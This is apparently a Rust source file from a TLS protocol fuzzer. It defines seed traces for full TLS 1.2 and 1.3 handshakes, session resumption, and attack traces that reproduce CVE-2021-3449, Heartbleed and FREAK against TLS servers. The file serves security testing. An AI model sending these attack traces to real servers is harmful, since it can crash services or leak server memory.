//! Implementation of  special traces. Each may represent a special TLS execution like a full
//! handshake or an execution which crahes OpenSSL.

use rustls::msgs::handshake::CertificatePayload;
use rustls::msgs::message::{Message, OpaqueMessage};
use rustls::{
    internal::msgs::{
        enums::Compression,
        handshake::{ClientExtension, Random, ServerExtension, SessionID},
    },
    CipherSuite, ProtocolVersion,
};

use crate::agent::{AgentDescriptor, TLSVersion};
use crate::term;
use crate::tls::fn_impl::*;
use crate::{
    agent::AgentName,
    term::Term,
    trace::{Action, InputAction, OutputAction, Step, Trace},
};

pub fn seed_successful(client: AgentName, server: AgentName) -> Trace {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_3,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_3,
                server: true,
            },
        ],
        steps: vec![
            Step {
                agent: client,
                action: Action::Output(OutputAction { id: 0 }),
            },
            // Client Hello Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_hello(
                            ((0, 0)/ProtocolVersion),
                            ((0, 0)/Random),
                            ((0, 0)/SessionID),
                            ((0, 0)/Vec<CipherSuite>),
                            ((0, 0)/Vec<Compression>),
                            ((0, 0)/Vec<ClientExtension>)
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 1 }),
            },
            // Server Hello Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello(
                            ((1, 0)/ProtocolVersion),
                            ((1, 0)/Random),
                            ((1, 0)/SessionID),
                            ((1, 0)/CipherSuite),
                            ((1, 0)/Compression),
                            ((1, 0)/Vec<ServerExtension>)
                        )
                    },
                }),
            },
            // Encrypted Extensions Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((1, 0)/Vec<u8>)
                        )
                    },
                }),
            },
            // Certificate Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((1, 1)/Vec<u8>)
                        )
                    },
                }),
            },
            // Certificate Verify Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((1, 2)/Vec<u8>)
                        )
                    },
                }),
            },
            // Finish Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((1, 3)/Vec<u8>)
                        )
                    },
                }),
            },
            Step {
                agent: client,
                action: Action::Output(OutputAction { id: 2 }),
            },
            // Finished Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((2, 0)/Vec<u8>)
                        )
                    },
                }),
            },
        ],
    }
}

pub fn seed_successful12(client: AgentName, server: AgentName) -> Trace {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
            },
        ],
        steps: vec![
            OutputAction::new_step(client, 0),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((0, 0)/ProtocolVersion),
                        ((0, 0)/Random),
                        ((0, 0)/SessionID),
                        ((0, 0)/Vec<CipherSuite>),
                        ((0, 0)/Vec<Compression>),
                        ((0, 0)/Vec<ClientExtension>)
                    )
                },
            ),
            OutputAction::new_step(server, 1),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((1, 0)/ProtocolVersion),
                            ((1, 0)/Random),
                            ((1, 0)/SessionID),
                            ((1, 0)/CipherSuite),
                            ((1, 0)/Compression),
                            ((1, 0)/Vec<ServerExtension>)
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_certificate(
                            ((1, 0)/CertificatePayload)
                        )
                    },
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_key_exchange(
                            ((1, 0)/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello_done
                    },
                }),
            },
            Step {
                agent: client,
                action: Action::Output(OutputAction { id: 2 }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_key_exchange(
                            ((2, 0)/Vec<u8>)
                        )
                    },
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            // todo remove TLS12EncryptedHandshake as this is the correct way of doing it
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_opaque_message(
                            ((2, 2)/OpaqueMessage)
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 3 }),
            },
            // Ticket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_new_session_ticket(
                            ((3, 0)/u64),
                            ((3, 0)/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Change Cipher Spec, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
            // Server Handshake Finished, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_opaque_message(
                            ((3, 2)/OpaqueMessage)
                        )
                    },
                }),
            },
        ],
    }
}

pub fn seed_successful_with_ccs(client: AgentName, server: AgentName) -> Trace {
    let mut trace = seed_successful(client, server);

    // CCS Server -> Client, at index 4
    trace.steps.insert(
        4,
        Step {
            agent: client,
            action: Action::Input(InputAction {
                recipe: term! {
                    fn_change_cipher_spec
                },
            }),
        },
    );

    trace.steps.insert(
        10,
        Step {
            agent: server,
            action: Action::Input(InputAction {
                recipe: term! {
                    fn_change_cipher_spec
                },
            }),
        },
    );

    trace
}

pub fn seed_successful_with_tickets(client: AgentName, server: AgentName) -> Trace {
    let mut trace = seed_successful_with_ccs(client, server);

    trace.steps.push(Step {
        agent: server,
        action: Action::Output(OutputAction { id: 3 }),
    });
    // Ticket
    trace.steps.push(Step {
        agent: client,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_application_data(
                    ((3, 0)/Vec<u8>)
                )
            },
        }),
    });
    // Ticket
    trace.steps.push(Step {
        agent: client,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_application_data(
                    ((3, 1)/Vec<u8>)
                )
            },
        }),
    });

    trace
}

pub fn seed_client_attacker(server: AgentName) -> Trace {
    seed_client_attacker_(server).0
}

fn seed_client_attacker_(server: AgentName) -> (Trace, Term, Term, Term) {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            fn_secp384r1_support_group_extension
                        )),
                        fn_signature_algorithm_extension
                    )),
                    fn_key_share_deterministic_extension
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    let server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript,
                (@client_hello) // ClientHello
            )),
            ((0, 0)/Message) // plaintext ServerHello
        )
    };

    // ((0, 1)/Message) could be a CCS the server sends one

    let encrypted_extensions = term! {
        fn_decrypt_handshake(
            ((0, 1)/Message), // Encrypted Extensions
            ((0, 0)/Vec<ServerExtension>),
            (@server_hello_transcript),
            fn_no_psk,
            fn_seq_0  // sequence 0
        )
    };

    let encrypted_extension_transcript = term! {
        fn_append_transcript(
            (@server_hello_transcript),
            (@encrypted_extensions) // plaintext Encrypted Extensions
        )
    };

    let server_certificate = term! {
        fn_decrypt_handshake(
            ((0, 2)/Message),// Server Certificate
            ((0, 0)/Vec<ServerExtension>),
            (@server_hello_transcript),
            fn_no_psk,
            fn_seq_1 // sequence 1
        )
    };

    let server_certificate_transcript = term! {
        fn_append_transcript(
            (@encrypted_extension_transcript),
            (@server_certificate) // plaintext Server Certificate
        )
    };

    let server_certificate_verify = term! {
        fn_decrypt_handshake(
            ((0, 3)/Message), // Server Certificate Verify
            ((0, 0)/Vec<ServerExtension>),
            (@server_hello_transcript),
            fn_no_psk,
            fn_seq_2 // sequence 2
        )
    };

    let server_certificate_verify_transcript = term! {
        fn_append_transcript(
            (@server_certificate_transcript),
            (@server_certificate_verify) // plaintext Server Certificate Verify
        )
    };

    let server_finished = term! {
        fn_decrypt_handshake(
            ((0, 4)/Message), // Server Handshake Finished
            ((0, 0)/Vec<ServerExtension>),
            (@server_hello_transcript),
            fn_no_psk,
            fn_seq_3 // sequence 3
        )
    };

    let server_finished_transcript = term! {
        fn_append_transcript(
            (@server_certificate_verify_transcript),
            (@server_finished) // plaintext Server Handshake Finished
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                ((0, 0)/Vec<ServerExtension>),
                (@server_finished_transcript),
                (@server_hello_transcript),
                fn_no_psk
            ))
        )
    };

    let client_finished_transcript = term! {
        fn_append_transcript(
            (@server_finished_transcript),
            (@client_finished)
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            server: true,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 0 }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            ((0, 0)/Vec<ServerExtension>),
                            (@server_hello_transcript),
                            fn_no_psk,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 1 }),
            },
        ],
    };

    (
        trace,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    )
}

pub fn seed_client_attacker12(server: AgentName) -> Trace {
    _seed_client_attacker12(server).0
}

fn _seed_client_attacker12(server: AgentName) -> (Trace, Term) {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                (fn_client_extensions_append(
                                    fn_client_extensions_new,
                                    fn_secp384r1_support_group_extension
                                )),
                                fn_signature_algorithm_extension
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension(fn_empty_bytes_vec))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )
    };

    let server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript12,
                (@client_hello) // ClientHello
            )),
            ((0, 0)/Message) // plaintext ServerHello
        )
    };

    let certificate_transcript = term! {
        fn_append_transcript(
            (@server_hello_transcript),
            ((0, 1)/Message) // Certificate
        )
    };

    let server_key_exchange_transcript = term! {
      fn_append_transcript(
            (@certificate_transcript),
            ((0, 2)/Message) // ServerKeyExchange
        )
    };

    let server_hello_done_transcript = term! {
      fn_append_transcript(
            (@server_key_exchange_transcript),
            ((0, 3)/Message) // ServerHelloDone
        )
    };

    let client_key_exchange = term! {
        fn_client_key_exchange(
            (fn_new_pubkey12(
                (fn_decode_ecdh_params(
                    ((0, 0)/Vec<u8>) // ServerECDHParams
                ))
            ))
        )
    };

    let client_key_exchange_transcript = term! {
      fn_append_transcript(
            (@server_hello_done_transcript),
            (@client_key_exchange)
        )
    };

    let client_verify_data = term! {
        fn_sign_transcript(
            ((0, 0)/Random),
            (fn_decode_ecdh_params(
                ((0, 0)/Vec<u8>) // ServerECDHParams
            )),
            (@client_key_exchange_transcript)
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_2,
            server: true,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello,
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 0 }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_key_exchange,
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! { fn_change_cipher_spec },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt12(
                            (fn_finished((@client_verify_data))),
                            ((0, 0)/Random),
                            (fn_decode_ecdh_params(
                                ((0, 0)/Vec<u8>) // ServerECDHParams
                            )),
                            fn_seq_0
                        )
                    },
                }),
            },
        ],
    };

    (trace, client_verify_data)
}

pub fn seed_cve_2021_3449(server: AgentName) -> Trace {
    let (mut trace, client_verify_data) = _seed_client_attacker12(server);

    let renegotiation_client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                fn_secp384r1_support_group_extension
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension((@client_verify_data)))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )
    };

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    (@renegotiation_client_hello),
                    ((0, 0)/Random),
                    (fn_decode_ecdh_params(
                        ((0, 2)/Vec<u8>) // ServerECDHParams
                    )),
                    fn_seq_1
                )
            },
        }),
    });

    /*    trace.stepSignature::push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    fn_alert_close_notify,
                    ((0, 0)/Random),
                    (fn_decode_ecdh_params(
                        ((0, 2)/Vec<u8>) // ServerECDHParams
                    )),
                    fn_seq_1
                )
            },
        }),
    });*/

    trace
}

pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        fn_client_extensions_new,
                        fn_secp384r1_support_group_extension
                    )),
                    fn_ec_point_formats_extension
                )),
                fn_signed_certificate_timestamp_extension
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
            },
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello,
                }),
            },
            // Send directly after client_hello such that this does not need to be encrypted
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_heartbeat_fake_length(fn_empty_bytes_vec, fn_large_length)
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_freak(client: AgentName, server: AgentName) -> Trace {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
            },
        ],
        steps: vec![
            OutputAction::new_step(client, 0),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((0, 0)/ProtocolVersion),
                        ((0, 0)/Random),
                        ((0, 0)/SessionID),
                        (fn_append_cipher_suite(
                            (fn_new_cipher_suites()),
                            fn_weak_export_cipher_suite
                        )),
                        ((0, 0)/Vec<Compression>),
                        ((0, 0)/Vec<ClientExtension>)
                    )
                },
            ),
            OutputAction::new_step(server, 1),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((1, 0)/ProtocolVersion),
                            ((1, 0)/Random),
                            ((1, 0)/SessionID),
                            (fn_secure_rsa_cipher_suite12),
                            ((1, 0)/Compression),
                            ((1, 0)/Vec<ServerExtension>)
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_certificate(
                            ((1, 1)/CertificatePayload)
                        )
                    },
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_key_exchange( // check whether the client rejects this if it does not support export
                            ((1, 2)/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello_done
                    },
                }),
            },
            Step {
                agent: client,
                action: Action::Output(OutputAction { id: 2 }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_key_exchange(
                            ((2, 0)/Vec<u8>)
                        )
                    },
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
        ],
    }
}

pub fn seed_session_resumption_dhe(server: AgentName) -> Trace {
    let (
        initial_handshake,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    ) = seed_client_attacker_(server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((1, 0)/Message), // Ticket?
            ((0, 0)/Vec<ServerExtension>),
            (@server_hello_transcript),
            (@server_finished_transcript),
            fn_no_psk,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                (fn_client_extensions_append(
                                    fn_client_extensions_new,
                                    fn_secp384r1_support_group_extension
                                )),
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        fn_key_share_deterministic_extension
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (fn_get_ticket((@new_ticket_message))),
                    (fn_get_ticket_age_add((@new_ticket_message)))
                ))
            ))
        )
    };

    let psk = term! {
        fn_derive_psk(
                ((0, 0)/Vec<ServerExtension>),
                (@server_hello_transcript),
                (@server_finished_transcript),
                (@client_finished_transcript),
                (fn_get_ticket_nonce((@new_ticket_message)))
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    let resumption_server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript,
                (@full_client_hello) // ClientHello
            )),
            ((10, 0)/Message) // plaintext ServerHello
        )
    };

    let resumption_encrypted_extensions = term! {
        fn_decrypt_handshake(
            ((10, 1)/Message), // Encrypted Extensions
            ((10, 0)/Vec<ServerExtension>),
            (@resumption_server_hello_transcript),
            (fn_psk((@psk))),
            fn_seq_0  // sequence 0
        )
    };

    let resumption_encrypted_extension_transcript = term! {
        fn_append_transcript(
            (@resumption_server_hello_transcript),
            (@resumption_encrypted_extensions) // plaintext Encrypted Extensions
        )
    };

    let resumption_server_finished = term! {
        fn_decrypt_handshake(
            ((10, 2)/Message), // Server Handshake Finished
            ((10, 0)/Vec<ServerExtension>),
            (@resumption_server_hello_transcript),
            (fn_psk((@psk))),
            fn_seq_1 // sequence 1
        )
    };

    let resumption_server_finished_transcript = term! {
        fn_append_transcript(
            (@resumption_encrypted_extension_transcript),
            (@resumption_server_finished) // plaintext Server Handshake Finished
        )
    };

    let resumption_client_finished = term! {
        fn_finished(
            (fn_verify_data(
                ((10, 0)/Vec<ServerExtension>),
                (@resumption_server_finished_transcript),
                (@resumption_server_hello_transcript),
                (fn_psk((@psk)))
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            server: true,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction { id: 10 }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@resumption_client_finished),
                            ((10, 0)/Vec<ServerExtension>),
                            (@resumption_server_hello_transcript),
                            (fn_psk((@psk))),
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
        ],
    };

    trace
}

fn fn_debug(message: &Message) -> Result<Message, crate::tls::error::FnError> {
    dbg!(message);
    Ok(message.clone())
}
